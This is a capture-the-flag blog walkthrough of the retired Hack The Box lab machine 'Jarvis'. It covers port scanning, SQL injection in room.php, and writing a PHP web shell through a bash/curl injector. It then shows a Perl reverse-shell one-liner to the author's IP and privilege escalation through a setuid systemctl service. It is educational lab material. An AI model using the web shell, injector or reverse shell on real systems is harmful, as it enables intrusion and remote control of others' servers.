---
layout: post
title: "Jarvis: Hack The Box Walkthrough"
date: 2019-11-10 03:54:38 +0000
last_modified_at: 2019-11-10 03:54:38 +0000
category: Walkthrough
tags: ["Hack The Box", Jarvis, retired]
comments: true
image:
  feature: jarvis-htb-walkthrough.jpg
  credit: JasonPinaster / Pixabay
  creditlink: https://pixabay.com/photos/courthouse-311-jarvis-st-toronto-1061123/
---

This post documents the complete walkthrough of Jarvis, a retired vulnerable [VM][1] created by [manulqwerty][2] and [Ghostpp7][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Jarvis is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.143 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-23 07:52:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 64999/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
```

Port `64999/tcp` sure looks interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,64999 -A --reason -oN nmap.txt 10.10.10.143
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

Stark Hotel? I'm sensing an Iron-Man theme here. :laughing: It appears that `64999/tcp` is also a `http` service. Here's how both of them looks like.

_80/tcp_


{% include image.html image_alt="900ac137.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/900ac137.png" %}


_64999/tcp_


{% include image.html image_alt="835a70ee.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/835a70ee.png" %}


Hmm. Some kind of anti-bruteforce mechanism is in place.

### SQL Injection in `cod`

It wasn't long before I found a page that may possibly be susceptible to SQL injection.


{% include image.html image_alt="26bafacb.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/26bafacb.png" %}


I made a guess—the database could be MySQL.

```
# sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --dbms=mysql --batch
```

Bingo!


{% include image.html image_alt="6d8f2a7d.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/6d8f2a7d.png" %}


Armed with that insight, I could write/inject a PHP file to `/images` directory of the Apache default installation. This directory is almost certain to be writable by `www-data`. The PHP file is simple.

~~~~php
<?php echo shell_exec($_GET[0]); ?>
~~~~

Towards that end, I wrote a `bash` injector of sorts using `curl` as the main driver.

<div class="filename"><span>room</span></div>

~~~~bash
#!/bin/bash

HOST=supersecurehotel.htb
ROOM="room.php?cod="
COOKIE=$(mktemp -u)

if [ -z "$1" ]; then
  SQLI=$(urlencode "-1 UNION ALL SELECT 1,2,'<?php echo shell_exec(\$_GET[0]); ?>',4,5,6,7 INTO OUTFILE '/var/www/html/images/cmd.php'-- qwerty")
else
  SQLI=$(urlencode "-1 UNION ALL SELECT 1,2,$1,4,5,6,7-- qwerty")
fi

curl -s \
     -c $COOKIE \
     -o /dev/null \
     http://$HOST/

curl -s \
     -b $COOKIE \
     "http://$HOST/${ROOM}${SQLI}" \
| sed -r '/<span class="price-room">/,/<\/span>/!d' \
| sed -r -e 's/\s+<span class="price-room">//' -e '$d' \
| sed -r 's/<\/span>//'

# clean up
rm -f $COOKIE
~~~~

Running the script without argument creates `cmd.php` in `/images`.


{% include image.html image_alt="f2c794ca.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/f2c794ca.png" %}


## Low-Privilege Shell

Having `cmd.php` is as good as getting a shell. Let's run a Perl one-liner reverse shell back to me, like so:

```
perl -e 'use Socket;$i="10.10.14.163";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Bam.


{% include image.html image_alt="91071a5b.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/91071a5b.png" %}


## Privilege Escalation

During enumeration of `www-data`'s account, I noted that `www-data` is able to `sudo` as `pepper` to run a Python script.


{% include image.html image_alt="e3c8db1e.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/e3c8db1e.png" %}


### Getting `user.txt`

Check out the function `exec_ping()` in `simpler.py`.


{% include image.html image_alt="8ac6dfe4.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/8ac6dfe4.png" %}


We can easily bypass the filter and get ourselves a shell as `pepper`. First, we create a reverse shell with `msfvenom`.


{% include image.html image_alt="73c35f66.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/73c35f66.png" %}


Next, we host the reverse shell with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Finally, let's download the file.


{% include image.html image_alt="324934ad.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/324934ad.png" %}


We need to `chmod` the file to be executable as well. I'll leave that as an exercise. Once that's done, we can run the reverse shell over to us.


{% include image.html image_alt="62b3a175.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/62b3a175.png" %}


On our `nc` listener, a reverse shell appears...


{% include image.html image_alt="8ab63511.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/8ab63511.png" %}


`user.txt` is at `pepper`'s home directory.


{% include image.html image_alt="b37fb682.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/b37fb682.png" %}


### Getting `root.txt`

During enumeration of `pepper`'s account, I noted a `setuid` `systemctl` executable where the group `pepper` has the right to execute it.


{% include image.html image_alt="9aafd008.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/9aafd008.png" %}


This executable is associated with controlling `systemd` services. I guess I have to create my own service. :triumph:


{% include image.html image_alt="32d86c64.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/32d86c64.png" %}


Next, symlink `/etc/systemd/system/aaa.service` to `/tmp/aaa.service`.


{% include image.html image_alt="ac0c4c8d.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/ac0c4c8d.png" %}


Start the service `systemctl start aaa` and profit!


{% include image.html image_alt="0f797379.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/0f797379.png" %}


Sweet. Retrieving `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="0c3b83b8.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/0c3b83b8.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/194
[2]: https://www.hackthebox.eu/home/users/profile/25205
[3]: https://www.hackthebox.eu/home/users/profile/24844
[4]: https://www.hackthebox.eu/
